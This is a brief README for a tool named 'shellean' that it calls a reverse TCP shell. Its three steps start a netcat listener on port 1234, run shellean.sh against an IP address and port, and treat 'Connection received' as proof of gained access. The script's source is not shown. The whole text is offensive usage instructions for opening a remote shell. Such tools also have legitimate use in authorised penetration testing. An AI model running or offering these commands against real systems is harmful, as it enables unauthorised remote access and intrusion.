## shellean

**Reverse TCP Shell.**  

**1. Fire up Netcat for incoming connections. `$ nc -lvp 1234`**  
**2. Run shellean.sh. `$ ./shellean.sh -a 192.168.1.109 -p 1234`**  
**3. If you get this message `Connection received` it means you gained access.**
